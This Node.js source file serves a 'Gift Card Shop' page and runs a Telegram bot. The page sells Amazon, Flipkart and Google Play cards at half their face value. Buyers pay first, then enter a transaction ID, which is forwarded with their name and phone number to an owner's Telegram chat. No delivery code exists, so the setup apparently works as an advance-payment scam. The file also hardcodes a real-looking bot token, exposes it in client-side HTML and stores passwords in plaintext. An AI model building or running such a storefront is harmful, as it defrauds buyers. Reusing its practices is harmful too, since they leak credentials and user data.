import http from 'http';

const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
const OWNER_ID = "8558052873";
const PORT = process.env.PORT || 3000;

const HTML = `<!DOCTYPE html>
<html>
<head>
    <title>Gift Card Shop</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{font-family:Arial;background:#0a0a2a;color:white;padding:20px;margin:0}
        .container{max-width:400px;margin:auto;background:rgba(255,255,255,0.1);padding:25px;border-radius:20px;margin-top:50px}
        h2{color:#00ff88;text-align:center}
        input{width:100%;padding:12px;margin:10px 0;background:#1a1a3a;border:1px solid #00ff88;border-radius:10px;color:white;box-sizing:border-box}
        button{width:100%;padding:12px;margin:5px 0;background:#00ff88;border:none;border-radius:10px;color:#0a0a2a;font-weight:bold;cursor:pointer}
        .logout-btn{background:#ff4444;color:white}
        .message{text-align:center;padding:10px;margin-top:10px;border-radius:10px;display:none}
        .product{background:#1a1a3a;padding:15px;margin:10px 0;border-radius:10px;cursor:pointer;display:flex;justify-content:space-between}
        .product-price{color:#00ff88;font-weight:bold}
    </style>
</head>
<body>
<div id="app"></div>
<script>
const BOT_TOKEN = "${BOT_TOKEN}";
let currentUser = null;

function saveUser(user){
    let users = JSON.parse(localStorage.getItem('users') || '{}');
    users[user.phone] = user;
    localStorage.setItem('users', JSON.stringify(users));
}

function getUsers(){
    return JSON.parse(localStorage.getItem('users') || '{}');
}

function showMessage(msg, type){
    let msgDiv = document.getElementById('message');
    if(!msgDiv) return;
    msgDiv.innerHTML = msg;
    msgDiv.className = 'message ' + type;
    msgDiv.style.display = 'block';
    setTimeout(() => { msgDiv.style.display = 'none'; }, 3000);
}

function showLogin(){
    document.getElementById('app').innerHTML = \`
        <div class="container">
            <h2>🔐 GIFT CARD SHOP</h2>
            <div id="message" class="message"></div>
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Login</button>
            <button onclick="showRegister()" style="background:#333;color:white;">New User? Register</button>
        </div>
    \`;
}

function showRegister(){
    document.getElementById('app').innerHTML = \`
        <div class="container">
            <h2>📝 REGISTER</h2>
            <div id="message" class="message"></div>
            <input type="text" id="name" placeholder="Full Name">
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="register()">Register</button>
            <button onclick="showLogin()" style="background:#333;color:white;">Back</button>
        </div>
    \`;
}

function showBotVerification(){
    document.getElementById('app').innerHTML = \`
        <div class="container">
            <h2>🤖 VERIFY TELEGRAM</h2>
            <div id="message" class="message"></div>
            <p>1. Open Telegram</p>
            <p>2. Search <strong>@Giftclerkbot</strong></p>
            <p>3. Send <strong>/start</strong> to bot</p>
            <p>4. <strong>Tap on the code</strong> to copy it</p>
            <p>5. Paste below:</p>
            <input type="text" id="code" placeholder="Paste code here">
            <button onclick="verifyCode()">Verify</button>
        </div>
    \`;
}

function showShop(){
    const products = [
        {name:"Amazon ₹50",value:50,price:25},{name:"Amazon ₹100",value:100,price:50},
        {name:"Amazon ₹200",value:200,price:100},{name:"Amazon ₹500",value:500,price:250},
        {name:"Amazon ₹1000",value:1000,price:500},{name:"Flipkart ₹50",value:50,price:25},
        {name:"Flipkart ₹100",value:100,price:50},{name:"Flipkart ₹200",value:200,price:100},
        {name:"Flipkart ₹500",value:500,price:250},{name:"Google Play ₹50",value:50,price:25},
        {name:"Google Play ₹100",value:100,price:50},{name:"Google Play ₹200",value:200,price:100}
    ];
    let productsHtml = '';
    for(let i=0;i<products.length;i++){
        let p = products[i];
        productsHtml += '<div class="product" onclick="order(\\''+p.name+'\\','+p.value+','+p.price+')">' +
            '<span>'+p.name+'</span><span class="product-price">Pay ₹'+p.price+'</span></div>';
    }
    document.getElementById('app').innerHTML = \`
        <div class="container">
            <h2>🛍️ Welcome \${currentUser.name}</h2>
            <div id="message" class="message"></div>
            \${productsHtml}
            <button onclick="logout()" class="logout-btn">Logout</button>
        </div>
    \`;
}

function login(){
    let phone = document.getElementById('phone').value;
    let password = document.getElementById('password').value;
    if(!phone || !password){ showMessage('Fill all fields','error'); return; }
    let users = getUsers();
    let user = users[phone];
    if(user && user.password === password){
        currentUser = user;
        if(!user.telegramId){ showBotVerification(); }
        else { showShop(); }
    } else { showMessage('Invalid phone or password','error'); }
}

function register(){
    let name = document.getElementById('name').value;
    let phone = document.getElementById('phone').value;
    let password = document.getElementById('password').value;
    if(!name || !phone || !password){ showMessage('Fill all fields','error'); return; }
    let users = getUsers();
    if(users[phone]){ showMessage('Phone already registered','error'); return; }
    let newUser = { name:name, phone:phone, password:password, telegramId:null };
    saveUser(newUser);
    showMessage('Registration successful! Please login.','success');
    setTimeout(() => { showLogin(); }, 2000);
}

function verifyCode(){
    let code = document.getElementById('code').value;
    if(!code){ showMessage('Enter code from bot','error'); return; }
    currentUser.telegramId = code;
    let users = getUsers();
    users[currentUser.phone].telegramId = code;
    localStorage.setItem('users', JSON.stringify(users));
    fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:"${OWNER_ID}",text:'✅ New user verified!\\nName: '+currentUser.name+'\\nPhone: '+currentUser.phone})
    }).catch(()=>{});
    showMessage('Verified successfully!','success');
    setTimeout(() => { showShop(); }, 1000);
}

function order(name,value,price){
    let utr = prompt('Enter UTR / Transaction ID after payment');
    if(!utr) return;
    fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:"${OWNER_ID}",text:'🆕 NEW ORDER!\\nUser: '+currentUser.name+'\\nPhone: '+currentUser.phone+'\\nProduct: '+name+'\\nPaid: ₹'+price+'\\nUTR: '+utr})
    }).catch(()=>{});
    showMessage('Order placed! You will receive gift card within 24 hours.','success');
}

function logout(){
    currentUser = null;
    showLogin();
}

showLogin();
</script>
</body>
</html>`;

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML);
});

let offset = 0;

async function tg(method, data) {
    try {
        const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/' + method, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        return await res.json();
    } catch(e) { return {}; }
}

async function poll() {
    while (true) {
        try {
            const data = await tg('getUpdates', { offset: offset, timeout: 30 });
            if (data.ok && data.result) {
                for (let i = 0; i < data.result.length; i++) {
                    const update = data.result[i];
                    offset = update.update_id + 1;
                    if (update.message && update.message.text === '/start') {
                        const chatId = update.message.chat.id;
                        const code = 'USER_' + chatId + '_' + Date.now();
                        await tg('sendMessage', {
                            chat_id: chatId,
                            text: '✅ YOUR VERIFICATION CODE:\n\n`' + code + '`\n\n📋 **Tap on the code above** to copy it.\n\nThen paste it on the website to complete verification.',
                            parse_mode: 'Markdown'
                        });
                        console.log('Code sent to ' + chatId);
                    }
                }
            }
        } catch(e) { console.log('Bot error:', e.message); }
        await new Promise(r => setTimeout(r, 2000));
    }
}

server.listen(PORT, () => {
    console.log('✅ Server on port ' + PORT);
    console.log('✅ Bot running! Send /start to @Giftclerkbot');
});
poll();